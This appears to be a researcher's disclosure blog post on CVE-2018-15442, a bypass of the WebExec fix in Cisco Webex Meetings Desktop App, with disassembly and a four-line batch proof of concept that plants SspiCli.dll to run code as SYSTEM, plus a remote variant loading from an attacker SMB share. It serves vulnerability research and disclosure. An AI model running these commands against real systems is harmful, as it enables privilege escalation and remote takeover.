---
layout: post
title: "WebExec Reloaded :: Cisco Webex Meetings Desktop App Update Service DLL Planting Elevation of Privilege Vulnerability"
date: 2018-12-03 10:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Cisco Webex" src="/assets/images/cisco-webex-logo.jpg">
<p class="cn" markdown="1">Some time ago [Ron Bowes](https://twitter.com/iagox86) found a vulnerability in Cisco WebEx Meetings Desktop App that could allow local privilege escalation, or, if you have a user account you can use psexec to gain remote code execution as SYSTEM. They named the vulnerability **WebExec** (cute) and even gave it a pretty [website](https://webexec.org/)! The problem? Well, it turns out the patch wasn't so good...</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn" markdown="1">I walk through the re-discovery and exploitation of [CVE-2018-15442](/advisories/src-2018-0034) which is a bypass for the original bug. Since the original vulnerability and the bypass are so similar, Cisco decided to not issue a new CVE and I tend to agree with this choice. Technically its a remote code execution but the way this bug is triggered makes more sense for exploitation to come from a local context.</p>

### Introduction

<p class="cn" markdown="1">The [Webex site](https://www.webex.com/products/meetings/index.html) explains what webex is, quickly summing it up as:</p>

> ...With Webex Meetings, joining is a breeze, audio and video are clear, and screen sharing is easier than ever. We help you forget about the technology, to focus on what matters...

<p class="cn" markdown="1">Please Cisco, at least don't forget about the security of your technology!</p>

<p class="cn" markdown="1">So, after reading Ron's [blog post](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec) we know that the underlying issue was that the **WebExService** takes a user controlled binary and executes it as SYSTEM. I really don't think it gets easier than that for a vulnerability, hooray Cisco!</p>

### Re-discovering the Vulnerability

<p class="cn" markdown="1">According to Ron the patched version checks for a signed executable by WebEx.</p>

> The patched version of WebEx still allows remote users to connect to the process and start it. However, if the process detects that it's being asked to run an executable that is not signed by WebEx, the execution will halt. Unfortunately, that gives us no information about whether a host is vulnerable!

<p class="cn" markdown="1">Well, let's do what we normally do and check the patch for ourselves. After installing the latest [version](https://akamaicdn.webex.com/client/WBXclient-33.6.2-16/webexapp.msi) at the time from Cisco's CDN, we can check that we have no more updates to do:</p>

{% include image.html
            img="assets/images/latest-webex.png"
            title="Version 33.6.2.16 was the latest at the time"
            caption="Version 33.6.2.16 was the latest at the time"
            style="width:50%;height:50%" %}

<p class="cn" markdown="1">Diving into the binary stored at `C:\Program Files\Webex\Webex\Applications\WebExService.exe` we see some interesting things. The first thing I noticed is that the code only looks for one argument type, that is, `software-update`.</p>

```
.text:00402DC4 loc_402DC4:                                          ; CODE XREF: sub_402D80+1C
.text:00402DC4                 push    offset aSoftwareUpdate       ; "software-update"
.text:00402DC9                 push    dword ptr [esi+8]            ; lpString1
.text:00402DCC                 call    ds:lstrcmpiW
.text:00402DD2                 test    eax, eax
.text:00402DD4                 jnz     loc_402E66
.text:00402DDA                 push    208h                         ; Size
.text:00402DDF                 push    eax                          ; Val
.text:00402DE0                 lea     eax, [ebp+Dst]
.text:00402DE6                 push    eax                          ; Dst
.text:00402DE7                 call    memset
.text:00402DEC                 add     esp, 0Ch
.text:00402DEF                 lea     eax, [ebp+Dst]
.text:00402DF5                 push    offset pszFile               ; "ptupdate.exe"
.text:00402DFA                 push    dword ptr [esi+10h]          ; pszDir
.text:00402DFD                 push    eax                          ; pszDest
.text:00402DFE                 call    ds:PathCombineW
.text:00402E04                 sub     esp, 18h
.text:00402E07                 lea     eax, [ebp+Dst]
.text:00402E0D                 mov     ecx, esp                     ; Dst
.text:00402E0F                 mov     [esi+10h], eax
.text:00402E12                 push    eax                          ; Src
.text:00402E13                 call    sub_402EB0
.text:00402E18                 call    sub_402310                   ; signature check on ptupdate.exe
.text:00402E1D                 add     esp, 18h
.text:00402E20                 test    eax, eax
.text:00402E22                 jz      short loc_402E46             ; jump if we don't pass the check!
.text:00402E24                 lea     eax, [ebp+var_214]
.text:00402E2A                 mov     [ebp+var_214], 0
.text:00402E34                 push    eax
.text:00402E35                 push    ecx
.text:00402E36                 lea     ecx, [edi-3]
.text:00402E39                 lea     edx, [esi+0Ch]
.text:00402E3C                 call    sub_402960                   ; execute "ptupdate.exe" as winlogon.exe
```

<p class="cn" markdown="1">Later, the code does a PathCombineW call with an argument that we supply on the command line with the string `ptupdate.exe`. That's about where I stopped reversing. I didn't even bother to reverse the signature check function or the function that does the impersonation and execution. I already had a plan of attack.</p>

### Exploitation

<p class="cn" markdown="1">So at this point, all we needed to do was copy the `C:\Program Files\Webex\Webex\Applications\*` (including the ptUpdate.exe binary) into a user controlled folder that the guest or local user owns (this can be a sandboxed directory also) and either find a DLL planting vulnerability or force one by deleting one of the DLL's.</p>

<p class="cn" markdown="1">I don't like unexpected application behavior when I can avoid it, so I simply looked for a DLL planting issue that wouldn't affect application state. To do that I ran my litte proof of concept:</p>

```bat
mkdir %cd%\\si
copy C:\\PROGRA~1\\Webex\\Webex\\Applications\\* %cd%\\si\\*
sc start webexservice a software-update 1 %cd%\\si
```

<p class="cn" markdown="1">As it turns out, `SspiCli.dll` looked like a decent target.</p>

{% include image.html
            img="assets/images/DLL-planting.png"
            title="ptUpdate.exe can't find SspiCli.dll in the cwd"
            caption="ptUpdate.exe can't find SspiCli.dll in the cwd"
            style="width:100%;height:100%" %}

<p class="cn" markdown="1">Of course, we could have just cross referenced the 43 LoadLibraryW calls and leveraged one of those too. Unfortunately my proof of concept exploit needed to be 4 commands, instead of 3. Booooooo Cisco!</p>

```bat
mkdir %cd%\\si
copy C:\\PROGRA~1\\Webex\\Webex\\Applications\\* %cd%\\si\\*
copy SspiCli.dll %cd%\\si
sc start webexservice a software-update 1 %cd%\\si
```

{% include image.html
            img="assets/images/webex-lpe.png"
            title="LPE as SYSTEM via DLL planting"
            caption="LPE as SYSTEM via DLL planting"
            style="width:100%;height:100%" %}

<p class="cn" markdown="1">As mentioned, you could technically leverage this for RCE as SYSTEM as well, but its authenticated anyway. `sc \\victim start webexservice a software-update 1 "\\attacker\share\si"`.</p>

### Conclusion

<p class="cn" markdown="1">Whenever you control a path to a file operation that's being performed by a high privileged service, you are bound to be vulnerable to attacks. This vulnerability is so simple and powerful in that it can be triggered from remote using SMB as well as allow for a nice sandbox escape. I'm convinced that logical vulnerabilities will be the future of serious exploitation since they really do side step 99% of operating system level mitigations.</p>

<p class="cn" markdown="1">I find it incredible that Cisco couldn't patch this right the first time. All they needed to do was use a fixed path to the `C:\Program Files\Webex\Webex\Applications` directory and remove user controlled input all together. This vulnerability was found in about 10 minutes and I couldn't help but rename the vulnerability to *WebExec reloaded*, get it? ...re-loading an arbitrary DLL by an attacker!?</p>

<p class="cn" markdown="1">Finally, a big thanks to [iDefense](https://vcp.idefense.com/login.jsf) for helping with the coordination of the vulnerability!</p>

### References

<div markdown="1" class="cn">
- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection)
- [https://blog.skullsecurity.org/2018/technical-rundown-of-webexec](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)
</div>